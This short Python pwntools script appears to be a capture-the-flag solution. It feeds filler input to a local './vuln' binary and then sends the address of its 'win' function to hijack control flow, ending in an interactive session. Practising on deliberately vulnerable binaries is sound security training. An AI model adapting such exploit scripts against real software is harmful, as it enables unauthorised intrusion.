#!/usr/bin/env python

from pwn import *

p = process('./vuln')
e = ELF('./vuln')

def trash():
	for i in range(4):
		p.recv()
		p.sendline('test')

win = e.symbols['win']

log.info('Win Function: '+str(win))

trash()

p.sendline(str(win))

p.interactive()